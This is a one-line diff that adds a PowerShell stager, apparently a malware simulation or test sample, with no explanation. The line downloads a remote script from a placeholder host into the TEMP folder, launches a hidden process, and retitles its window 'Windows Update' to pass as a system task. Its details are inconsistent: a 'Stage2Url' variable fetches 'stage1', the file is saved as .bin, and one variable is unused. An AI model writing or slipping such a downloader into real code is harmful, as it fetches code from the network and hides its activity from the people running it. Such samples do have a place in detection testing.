@@ -1,0 +1,1 @@
+$Stage2Url = "https://contoso.com:8443/stage1.ps1"; $OutputPath = "$env:TEMP\stage1.bin"; $TimeoutSec = 22; Invoke-WebRequest -Uri $Stage2Url -OutFile $OutputPath -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Start-Sleep -Seconds 7; $Host.UI.RawUI.WindowTitle = "Windows Update"
